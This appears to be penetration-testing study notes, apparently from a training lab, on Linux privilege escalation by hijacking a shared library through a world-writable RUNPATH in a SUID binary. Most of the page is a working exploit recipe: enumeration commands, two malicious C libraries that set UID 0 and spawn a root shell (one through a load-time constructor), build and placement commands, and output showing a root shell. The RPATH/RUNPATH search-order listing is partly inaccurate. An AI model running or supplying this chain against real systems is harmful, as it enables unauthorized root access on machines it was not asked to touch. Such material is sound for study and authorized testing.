## Shared Object Hijacking

Shared object hijacking exploits the RUNPATH or RPATH embedded in a SUID binary that points to a directory writable by unprivileged users. Because RUNPATH is checked before all standard library locations, a malicious `.so` placed there will be loaded instead of the real library, and since the binary is SUID root, that code runs as root. 

***

## RPATH vs RUNPATH

Both embed a library search path directly inside the binary at compile time, but they differ in search order priority: 

```
RPATH search order:
  1. RPATH (embedded, checked first, before LD_LIBRARY_PATH)
  2. LD_LIBRARY_PATH
  3. RUNPATH
  4. /etc/ld.so.conf paths
  5. Default system dirs (/lib, /usr/lib)

RUNPATH search order:
  1. LD_LIBRARY_PATH
  2. RUNPATH (checked after LD_LIBRARY_PATH but before system dirs)
  3. /etc/ld.so.conf paths
  4. Default system dirs
```

From an exploitation standpoint, both are equally dangerous if their directory is writable. 

***

## Enumeration

### Step 1: Find SUID Binaries Using Non-Standard Libraries

```bash
# Find all SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Check each for custom library dependencies
ldd /path/to/suid-binary

# Look for .so files not in standard system dirs
ldd /path/to/suid-binary | grep -v "linux-vdso\|/lib\|/usr/lib"

# Example output that indicates a custom library:
# libshared.so => /development/libshared.so
# libshared.so => not found   <- even better, means the dir may not exist yet
```

### Step 2: Confirm RUNPATH and Check Directory Permissions

```bash
# Check for embedded RUNPATH or RPATH
readelf -d /path/to/suid-binary | grep PATH
# 0x000000000000001d (RUNPATH) Library runpath: [/development]

# Alternative
objdump -x /path/to/suid-binary | grep -i rpath

# Check if that directory is writable
ls -la /development
# drwxrwxrwx 2 root root 4096 Sep 1 22:06 ./   <- world-writable
```

### Step 3: Identify the Required Function Name

Drop a real library into the RUNPATH directory and trigger the binary to reveal the expected function name in the error output:

```bash
# Copy any standard library to satisfy the loader
cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so

# Run the binary and observe the error
./payroll
# ./payroll: symbol lookup error: undefined symbol: dbquery
#                                                    ^--- this is the function name
```

***

## Exploitation

### Step 4: Write the Malicious Library

The library only needs to export the function the binary calls. The function sets UID/GID to 0 then spawns a shell: 

```c
// src.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void dbquery() {
    printf("Malicious library loaded\n");
    setuid(0);
    setgid(0);
    system("/bin/sh -p");
}
```

If you do not know the specific function name but want a reliable trigger, use a constructor instead. It fires unconditionally as soon as the library loads, regardless of what function the binary actually calls:

```c
// constructor variant - fires before main(), no function name needed
#include <stdlib.h>
#include <unistd.h>

void __attribute__((constructor)) pwn() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
```

### Step 5: Compile and Place

```bash
# Compile as a shared object into the writable RUNPATH directory
gcc src.c -fPIC -shared -o /development/libshared.so

# Confirm it landed in the right place
ls -la /development/libshared.so
```

### Step 6: Execute the SUID Binary

```bash
./payroll

# Output:
# ***************Inlane Freight Employee Database***************
# Malicious library loaded
# # id
# uid=0(root) gid=1000(mrb3n) groups=1000(mrb3n)
```

***

## Full Command Reference

```bash
# 1. Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# 2. Inspect library dependencies
ldd ./payroll

# 3. Check for writable RUNPATH
readelf -d ./payroll | grep PATH

# 4. Verify directory is writable
ls -la /development/

# 5. Probe for required function name
cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so && ./payroll 2>&1 | grep "undefined symbol"

# 6. Compile the malicious library
gcc src.c -fPIC -shared -o /development/libshared.so

# 7. Run the SUID binary
./payroll
```

***

## Why `-fPIC` and `-shared` Are Required

| Flag | Purpose |
|---|---|
| `-shared` | Tells gcc to produce a shared object `.so` rather than an executable |
| `-fPIC` | Position Independent Code - required for shared libraries so they load at any memory address without relocation errors  [tbhaxor](https://tbhaxor.com/exploiting-shared-library-misconfigurations/) |
| `-nostartfiles` | Skips the standard C startup code, needed when using `_init()` directly since the standard startup defines its own `_init` |

When using `__attribute__((constructor))` rather than `_init()`, `-nostartfiles` is not needed and should be omitted to avoid linker errors.
